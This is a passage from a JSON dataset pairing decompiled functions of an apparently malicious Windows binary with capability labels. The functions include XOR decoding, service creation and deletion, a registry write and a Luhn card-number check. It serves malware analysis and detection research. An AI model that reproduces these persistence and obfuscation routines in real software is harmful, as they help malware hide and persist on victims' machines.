        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047a5) overlaps instruction at (ram,0x004047a3)\n// \n\nuint8_t * __cdecl fcn.00404740(uint8_t *arg_8h, uint8_t *arg_ch, uint8_t *noname_2, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    bool bVar7;\n    \n    bVar7 = CARRY4(arg_8h - arg_14h, arg_ch);\n    puVar4 = arg_ch + (arg_8h - arg_14h);\n    if ((!bVar7) && (bVar7)) {\n        puVar4 = puVar4 + bVar7 + *(puVar4 + arg_ch * 4 + 0x69);\n    }\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    bVar7 = SBORROW4(arg_8h, puVar4);\n    iVar1 = arg_8h - puVar4;\n    puVar2 = arg_8h;\n    if (arg_8h <= puVar4) {\n        do {\n            if ((bVar7 != iVar1 < 0) || (puVar3 = arg_ch,  bVar7 == iVar1 < 0)) {\n                puVar2 = *arg_8h;\n                puVar3 = arg_ch & 0xffffff00 | *noname_2;\n            }\n            arg_ch = arg_8h;\n            if (puVar2 == arg_8h) {\n                puVar2 = arg_14h + -1;\n                arg_ch = NULL;\n                bVar7 = true;\n                puVar5 = puVar3;\n                puVar6 = noname_2;\n                do {\n                    puVar6 = puVar6 + 1;\n                    puVar5 = puVar5 + 1;\n                    if (puVar2 == NULL) break;\n                    puVar2 = puVar2 + -1;\n                    bVar7 = *puVar5 == *puVar6;\n                } while (bVar7);\n                if (bVar7) {\n                    return puVar3;\n                }\n            }\n            arg_8h = puVar3 + 1;\n            bVar7 = SBORROW4(arg_8h, puVar4);\n            iVar1 = arg_8h - puVar4;\n        } while (arg_8h < puVar4 || iVar1 == 0);\n    }\n    return NULL;\n}\n",
        "token_count": 593
    },
    "00404c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404c50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404880(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00401860": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401860(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00403650": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004036aa) overlaps instruction at (ram,0x004036a8)\n// \n\nbool __cdecl fcn.00403650(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char cVar4;\n    uint uVar3;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    char *pcVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    ulong uVar9;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar7 = &var_10bh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    var_8h = 0;\n    *(puVar7 + 2) = 0;\n    bVar8 = false;\n    uVar9 = fcn.00402820();\n    pcVar6 = uVar9 >> 0x20;\n    uVar3 = uVar9;\n    if ((!bVar8) && (bVar8)) {\n        out(_pe_dos_header, uVar9 >> 0x20);\n        do {\n            cVar4 = uVar3 >> 8;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar6);\n        piVar1 = puVar7 + pcVar6 * 2 + 3;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX + -0x73) = uVar3;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    var_4h = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    do {\n        uVar3 = fcn.004034f0();\n        arg_ch_00 = fcn.004034f0();\n        arg_ch_01 = fcn.004034f0();\n        fcn.004018e0(arg_10h, uVar3);\n        fcn.004018e0(arg_8h, arg_ch_00);\n        fcn.004018e0(arg_ch, arg_ch_01);\n        pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, str.M_2._OF, &lpBuffer, arg_10h);\n        iVar5 = fcn.00404c80(&var_314h);\n        if (iVar5 != 0) {\n            (*pcVar2)(&var_210h, str.U1w0, &lpBuffer, arg_8h);\n            iVar5 = fcn.00404c80(&var_210h);\n            if (iVar5 != 0) {\n                (*pcVar2)(&var_210h, str.U1w0, &lpBuffer, arg_ch);\n                iVar5 = fcn.00404c80(&var_210h);\n                if (iVar5 != 0) {\n                    iVar5 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar5 = var_8h;\n    } while (var_4h < 3);\n    fcn.004018e0(arg_14h, 4);\n    return iVar5 != 0;\n}\n",
        "token_count": 926
    },
    "00404a10": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404a10(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x424634, \"44\\aaU\", 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    },
    "004035b0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004035b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 154
    },
    "004037b0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004037b0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 126
    }
}